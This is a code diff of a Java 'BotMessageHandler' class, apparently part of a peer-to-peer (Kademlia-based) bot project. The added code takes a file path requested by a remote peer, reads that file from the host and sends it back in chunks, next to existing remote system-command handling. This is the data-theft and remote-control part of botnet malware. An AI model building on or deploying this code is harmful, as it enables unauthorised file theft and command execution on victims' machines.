@@ -42,6 +42,44 @@ class BotMessageHandler {
         }
     }
 
+    void handleCommandResponseMessage(Message messsage) {
+        logger.debug("\r\n\r\ncommand response received: \r\n"
+                + messsage.getResponse().getValue());
+    }
+
+    void handleFileRequestMessage(Message message) {
+        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());
+        String path = message.getFileRequest().getPath();
+
+        String fileName = getFileName(path);
+        FileReader fileReader = new FileReader();
+        FileReader.ChunkedFile chunkedFile = fileReader.readFile(path, CHUNK_SIZE);
+
+        List<byte[]> chunks = chunkedFile.chunks;
+        for (int i = 0; i < chunks.size(); i++) {
+            Message.FileChunkMsg fileChunkMsg = Message.FileChunkMsg.newBuilder()
+                    .setUuid(UUID.randomUUID().toString())
+                    .setFileName(fileName)
+                    .setFileSize(chunkedFile.fileSize)
+                    .setOrdinal(i)
+                    .setData(ByteString.copyFrom(chunks.get(i)))
+                    .build();
+            p2pLayer.fileChunk(sender, me, fileChunkMsg);
+        }
+
+    }
+
+    public String getFileName(String path) {
+        String[] split = null;
+        if (path.contains("/")) {
+            split = path.split("/");
+
+        } else if (path.contains("\\")) {
+            split = path.split("\\\\");
+        }
+        return split == null ? path : split[split.length - 1];
+    }
+
     String executeSystemCommand(String command) {
         if ("dir".equals(command)) {
             try {
@@ -58,25 +96,5 @@ class BotMessageHandler {
             }
         }
         return null;
-    }
-
-    void sendChunkedFile() {
-        String fileName = "filename";
-        String path = "path" + fileName;
-        FileReader fileReader = new FileReader();
-        FileReader.ChunkedFile chunkedFile = fileReader.readFile(path, CHUNK_SIZE);
-
-        List<byte[]> chunks = chunkedFile.chunks;
-        for (int i = 0; i < chunks.size(); i++) {
-            Message.FileChunkMsg fileChunkMsg = Message.FileChunkMsg.newBuilder()
-                    .setUuid(UUID.randomUUID().toString())
-                    .setFileName(path)
-                    .setFileSize() // TODO
-                    .setOrdinal(i)
-                    .setData(ByteString.copyFrom(chunks.get(i)))
-                    .build();
-  //          p2pLayer.fileChunk(x, x, fileChunkMsg);
-        }
-
     }
 }
